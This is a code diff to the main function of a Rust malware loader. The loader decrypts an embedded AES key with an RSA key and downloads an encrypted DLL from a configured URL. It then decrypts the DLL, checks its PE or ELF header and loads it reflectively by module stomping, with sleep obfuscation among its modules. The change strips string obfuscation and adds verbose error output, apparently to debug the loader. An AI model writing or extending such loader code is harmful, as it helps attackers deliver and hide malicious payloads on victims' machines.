@@ -5,7 +5,6 @@ mod pe_loader;
 mod sleep_obfuscation;
 
 use config::LoaderConfig;
-use obfstr::obfstr;
 use std::env;
 
 fn main() {
@@ -16,8 +15,7 @@ fn main() {
     let (injected, raw_json) = match parse_injected_config() {
         Some((cfg, json)) => (cfg, json),
         None => {
-            eprintln!("{}", obfstr!("[!] Configuration error"));
-            std::process::exit(1);
+            fatal_exit("[!] Config parse failed — no LIBRA_CFG_BLOCK! magic found");
         }
     };
 
@@ -62,9 +60,8 @@ fn main() {
     // 6. Decrypt AES key
     let mut aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
         Ok(k) => k,
-        Err(_) => {
-            eprintln!("{}", obfstr!("[!] Initialization failed"));
-            std::process::exit(1);
+        Err(e) => {
+            fatal_exit(&format!("[!] AES key decrypt failed: {}", e));
         }
     };
 
@@ -76,9 +73,8 @@ fn main() {
         .build()
     {
         Ok(rt) => rt,
-        Err(_) => {
-            eprintln!("{}", obfstr!("[!] Runtime error"));
-            std::process::exit(1);
+        Err(e) => {
+            fatal_exit(&format!("[!] Tokio runtime error: {}", e));
         }
     };
 
@@ -86,15 +82,13 @@ fn main() {
         Ok(encrypted) => {
             match dll_fetch::decrypt_dll(&encrypted, &aes_key) {
                 Ok(decrypted) => decrypted,
-                Err(_) => {
-                    eprintln!("{}", obfstr!("[!] Decryption failed"));
-                    std::process::exit(1);
+                Err(e) => {
+                    fatal_exit(&format!("[!] DLL decrypt failed: {}", e));
                 }
             }
         }
-        Err(_) => {
-            eprintln!("{}", obfstr!("[!] Network error"));
-            std::process::exit(1);
+        Err(e) => {
+            fatal_exit(&format!("[!] Download failed ({}): {}", download_url, e));
         }
     };
 
@@ -104,25 +98,24 @@ fn main() {
 
     // 9. Validate PE/ELF header
     if dll_bytes.len() < 2 {
-        std::process::exit(1);
+        fatal_exit("[!] DLL too small — no header");
     }
 
     #[cfg(target_os = "windows")]
     if dll_bytes[0] != 0x4D || dll_bytes[1] != 0x5A {
-        std::process::exit(1);
+        fatal_exit("[!] Not a valid PE (MZ header missing)");
     }
 
     #[cfg(target_os = "linux")]
     if dll_bytes[0] != 0x7F || dll_bytes[1] != 0x45 {
-        std::process::exit(1);
+        fatal_exit("[!] Not a valid ELF header");
     }
 
     // 10. Reflective load (Module Stomping: RW→memcpy→RX, never RWX)
     let entry_fn = match unsafe { pe_loader::reflective_load(&dll_bytes) } {
         Ok(f) => f,
-        Err(_) => {
-            eprintln!("{}", obfstr!("[!] Load failed"));
-            std::process::exit(1);
+        Err(e) => {
+            fatal_exit(&format!("[!] Reflective load failed: {}", e));
         }
     };
 
@@ -147,6 +140,17 @@ fn main() {
 
     // Should not return, but if it does:
     std::process::exit(0);
+}
+
+// ── Fatal exit with visible output ────────────────────────────────────
+
+fn fatal_exit(msg: &str) -> ! {
+    use std::io::Write;
+    let mut stderr = std::io::stderr();
+    let _ = writeln!(stderr, "{}", msg);
+    let _ = stderr.flush();
+    std::thread::sleep(std::time::Duration::from_millis(100));
+    std::process::exit(1);
 }
 
 // ── Config Injection ──────────────────────────────────────────────────
